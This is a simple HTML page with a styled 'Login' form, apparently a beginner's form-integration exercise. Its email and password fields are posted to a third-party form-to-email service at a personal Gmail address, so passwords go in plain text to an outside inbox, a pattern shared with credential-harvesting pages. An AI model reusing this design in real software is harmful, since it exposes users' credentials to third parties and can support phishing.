<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Integration</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-self: center;
            background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRSH6unMSzwq343yBPiK0W8bQF3ptkR36gpXA&s');
            background-size: cover;
            background-position: center;
            padding: 50px;
            color: whitesmoke;
        }

        h1 {
            margin-bottom: 50px;
            text-align: center;
            color: #bd341c;
        }

        form {
            background-color: rgba(33, 174, 202, 0.7); /* semi-transparent background */
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
        }

        label {
            font-size: 14px;
            font-weight: bold;
            color: #ffcc00; /* bright yellow */
            display: block;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 10px;
            border-radius: 5px;
            border: 2px solid #ffcc00;
            margin-bottom: 15px;
            background-color: #fff;
            color: #333;
        }

        input:hover {
            box-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
        }

        .submit {
            width: 100%;
            padding: 12px;
            background-color: #ffcc00;
            color: black;
            border-radius: 5px;
            border: none;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
        }

        .submit:hover {
            background-color: #e6b800;
        }

    </style>
</head>
<body>

    <h1>Login</h1>

    <form target="_blank" action="https://formsubmit.co/sofiaparvez18@gmail.com" method="POST">
        <div>
            <label for="Email">Email:</label>
            <input type="email" name="email" id="Email" placeholder="Enter email" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" placeholder="Enter password" required>
        </div>

        <button type="submit">Login</button>
    </form>

</body>
</html>
